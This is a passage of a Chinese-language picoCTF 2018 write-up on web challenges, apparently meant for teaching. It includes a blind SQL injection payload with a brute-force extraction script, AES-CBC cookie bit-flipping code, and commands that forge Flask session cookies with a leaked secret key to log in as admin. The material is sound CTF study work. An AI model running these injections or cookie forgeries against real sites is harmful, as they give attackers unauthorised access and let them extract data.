> programming mistakes.
## Solution
查看源码，发现有一处注释。
然后跳到登录页面，只有登录和找回密码功能。
点击忘记密码。
这里应该用到的就是源码里出现的用户名，输入并点击重置密码。有密保问题。
抓包发现一段`session`。
是flask的session，用[解码工具](https://github.com/noraj/flask-session-cookie-manager)解一下试试。
    flask-session-cookie-manager git/master
    ❯ python session_cookie_manager.py decode -c ".eJw9jd0OgjAMRl_F9HoX-JNFeRUlpECBxW01XQlRwru7XejVab-059ugX0QoKtQwMg9g4MUpuc4T1PdfNJNwRs-epRAl4JOgMSBumrXteSmGysCSSNoBFaHe4KDF8cHQCcYisOeLPV1vR1uBycfr7JRy3KEGjHlQfnN-NTCKo5S5Ou8dhvSI0Ox5FY7Tv23_Ar8wPVk.DqhNVw.Kz2YnbgDvhKMVlu7OgioYaSBPpU"
    {"current":"food","possible":["food","hero","color","carmake"],"right_count":0,"user_data":{" t":["zambrano","6346289160",0,"white","batman","toyota","fries","williams\n"]},"wrong_count":0}
答案都在这个list里面，对照类型回答问题，回答三次后可以重置密码，重置后使用自己的密码登录，得到flag。
flag:`picoCTF{i_thought_i_could_remember_those_cb4afc2a}`
# A Simple Question
## Question
> There is a website running at
> [http://2018shell1.picoctf.com:2644](http://2018shell1.picoctf.com:2644/)
> ([link](http://2018shell1.picoctf.com:2644/)). Try to see if you can answer
> its question.
### Hint
No Hints.
## Solution
注释里给出了源码
`asnwer2.php`
    ";
      echo "SQL query: ", htmlspecialchars($query), "\n";
      echo "";
    ?>
    query($query);
      $row = $result->fetchArray();
      if($answer == $CANARY)  {
        echo "Perfect!";
        echo "Your flag is: $FLAG";
      }
      elseif ($row) {
        echo "You are so close.";
      } else {
        echo "Wrong.";
      }
    ?>
简单的sql盲注，没有任何过滤，写脚本跑或者用sqlmap跑都可以，但是要注意的是，如果用`like`注入的话是不区分大小写的，可以用区分大小写的`GLOB`。
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    import requests
    from string import ascii_letters, digits
    flag = ''
    burp0_url = "http://2018shell2.picoctf.com:2644/answer2.php"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                     "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close", "Upgrade-Insecure-Requests": "1", "Pragma": "no-cache", "Cache-Control": "no-cache"}
    for j in xrange(1, 99):
        for i in digits+ascii_letters:
            cnt = j
            burp0_data = {
                "answer": "1' or hex(substr((select answer from answers limit 1 offset 0),{},1))=hex('{}') -- ".format(j, i)
                # "answer":"1' or (select answer from answers where answer like '{}%') -- ".format(flag+i)
            }
            r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
            if 'You' in r.content:
                flag = flag + i
                print flag
                cnt += 1
                break
        if cnt == j:
            break
    print (flag)
得到answer:`41AndSixSixths`，post过去得到flag。
flag:`picoCTF{qu3stions_ar3_h4rd_28fc1206}`
# Secure Logon
## Question
> Uh oh, the login page is more secure... I think.
> [http://2018shell1.picoctf.com:12004](http://2018shell1.picoctf.com:12004/)
> ([link](http://2018shell1.picoctf.com:12004/)).
> [Source](https://github.com/PlatyPew/picoctf-2018-writeup/blob/master/Web%20Exploitation/Secure%20Logon/files/server_noflag.py).
### Hint
> There are versions of AES that really aren't secure.
## Solution
查看题目提供的源码
    from flask import Flask, render_template, request, url_for, redirect, make_response, flash
    import json
    from hashlib import md5
    from base64 import b64decode
    from base64 import b64encode
    from Crypto import Random
    from Crypto.Cipher import AES
    app = Flask(__name__)
    app.secret_key = 'seed removed'
    flag_value = 'flag removed'
    BLOCK_SIZE = 16  # Bytes
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                    chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
    unpad = lambda s: s[:-ord(s[len(s) - 1:])]
    @app.route("/")
    def main():
        return render_template('index.html')
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        if request.form['user'] == 'admin':
            message = "I'm sorry the admin password is super secure. You're not getting in that way."
            category = 'danger'
            flash(message, category)
            return render_template('index.html')
        resp = make_response(redirect("/flag"))
        cookie = {}
        cookie['password'] = request.form['password']
        cookie['username'] = request.form['user']
        cookie['admin'] = 0
        print(cookie)
        cookie_data = json.dumps(cookie, sort_keys=True)
        encrypted = AESCipher(app.secret_key).encrypt(cookie_data)
        print(encrypted)
        resp.set_cookie('cookie', encrypted)
        return resp
    @app.route('/logout')
    def logout():
        resp = make_response(redirect("/"))
        resp.set_cookie('cookie', '', expires=0)
        return resp
    @app.route('/flag', methods=['GET'])
    def flag():
      try:
          encrypted = request.cookies['cookie']
      except KeyError:
          flash("Error: Please log-in again.")
          return redirect(url_for('main'))
      data = AESCipher(app.secret_key).decrypt(encrypted)
      data = json.loads(data)
      try:
         check = data['admin']
      except KeyError:
         check = 0
      if check == 1:
          return render_template('flag.html', value=flag_value)
      flash("Success: You logged in! Not sure you'll be able to see the flag though.", "success")
      return render_template('not-flag.html', cookie=data)
    class AESCipher:
        """
        Usage:
            c = AESCipher('password').encrypt('message')
            m = AESCipher('password').decrypt(c)
        Tested under Python 3 and PyCrypto 2.6.1.
        """
        def __init__(self, key):
            self.key = md5(key.encode('utf8')).hexdigest()
        def encrypt(self, raw):
            raw = pad(raw)
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return b64encode(iv + cipher.encrypt(raw))
        def decrypt(self, enc):
            enc = b64decode(enc)
            iv = enc[:16]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            return unpad(cipher.decrypt(enc[16:])).decode('utf8')
    if __name__ == "__main__":
        app.run()
cookie使用AES的CBC模式加解密
尝试使用用户名`admin' or 1=1#`登录
这里存在CBC`字节翻转攻击`，通过翻转密文块的字节，以控制明文的字节，具体可以参考
fuzz一下需要翻转的cookie字节下标，发现是10，然后获取翻转后的cookie
    cookie = "3rnA1PIvka2g+HXQVjBOaEtMwLBlMhKEMESJEWw+sIobKcPdVrZBGAZ6GcnVSWbRKjobSdvdjyOeYAX4z6ARbe3pfMRxP1EvKNd079YBPSI=".decode(
        'base64')
    flip = ord(cookie[10]) ^ ord("0") ^ ord("1")
    newCookie = (cookie[:10] + chr(flip) + cookie[11:]).encode('base64')
    print newCookie
得到新的cookie
`3rnA1PIvka2g+HTQVjBOaEtMwLBlMhKEMESJEWw+sIobKcPdVrZBGAZ6GcnVSWbRKjobSdvdjyOeYAX4z6ARbe3pfMRxP1EvKNd079YBPSI=`
更新cookie得到flag
flag:`picoCTF{fl1p_4ll_th3_bit3_a6396679}`
# Flaskcards Skeleton Key
## Question
> Nice! You found out they were sending the Secret_key:
> 385c16dd09098b011d0086f9e218a0a2. Now, can you find a way to log in as
> admin?
> [http://2018shell1.picoctf.com:48263](http://2018shell1.picoctf.com:48263/)
> ([link](http://2018shell1.picoctf.com:48263/)).
### Hint
> What can you do with a flask Secret_Key?
>
> The database still reverts every 2 hours
## Solution
题目页面和`Flaskcard`一样，但这题要求作为admin登录，访问/admin得到一段session
`.eJwlj0tqAzEQBe-itRdSt1rd8mWG_okYQwIz9irk7hak9q949VuOdeb1Ve6v8523cjyi3MvC4CmAA5QqklCOmsRDUYmGs6U1BpsNR53VyGu34FzmQgTGS4cYdeQaEI15NjAdEISunXoPJRZSTRyRhjKEoQk7L5e6Kbfi17mO188zv_efbOC-mFwmhKQDixNDInDTreW25jbh3r2vPP8jqPx9AAZePd0.DpA5UQ.ALSxhNUvHq8TDSk0gxcmee3A56E`
使用解密工具
    ❯ python session_cookie_manager.py decode -c ".eJwlj0uqAjEQAO-StYvuJN1Je5kh_UMRFGZ09Xh3d8B9FVT9lS33OG7l-t4_cSnb3cu1MNCYJGCM0aMxIYRKyljT20LRnIgCZDSrOWJUgGqLLUGTBd2c0HRwAKpwr3zyVbKOMbOZsU4XydXRJYhW1yQnAhkarKHlUuzYc3u_HvE8e3oncRue7khzdfLGxm1Chvvw0fFMY66n9zli_00glf8vm04_Fg.DsHtkw.IpOz5sQX8GykxrRCeyrQX9DGZtk" -s "a155eb4e1743baef085ff6ecfed943f2"
    {u'csrf_token': u'4459dc7dfdd158a45d36c6380fedd7d74197a662', u'_fresh': True, u'user_id': u'15', u'_id': u'60578590c61e4e36510eb9f97a8d3a19bf811905c582cd11e2002ca6cf0bf691dcd51cb76e01b9642681129f2778f3cc6b8d99fa41d9e55a4bf5d55097be6beb'}
修改user_id为1得到新session
    ❯ python session_cookie_manager.py encode -t "{u'csrf_token': u'4459dc7dfdd158a45d36c6380fedd7d74197a662', u'_fresh': True, u'user_id': u'15', u'_id': u'60578590c61e4e36510eb9f97a8d3a19bf811905c582cd11e2002ca6cf0bf691dcd51cb76e01b9642681129f2778f3cc6b8d99fa41d9e55a4bf5d55097be6beb'}" -s "a155eb4e1743baef085ff6ecfed943f2"
    .eJwlj0uqAjEQAO-StYvuJN1Je5kh_UMRFGZ09Xh3d8B9FVT9lS33OG7l-t4_cSnb3cu1MNCYJGCM0aMxIYRKyljT20LRnIgCZDSrOWJUgGqLLUGTBd2c0HRwAKpwr3zyVbKOMbOZsU4XydXRJYhW1yQnAhkarKHlUuzYc3u_HvE8e3oncRue7khzdfLGxm1Chvvw0fFMY66n9zli_01g-f8CXG0-4Q.DsHuig.Jz1d2DO-LBrOa_8RW8iuOOl78z4
替换新session登录得到flag
flag:`picoCTF{1_id_to_rule_them_all_8f9d57f1}`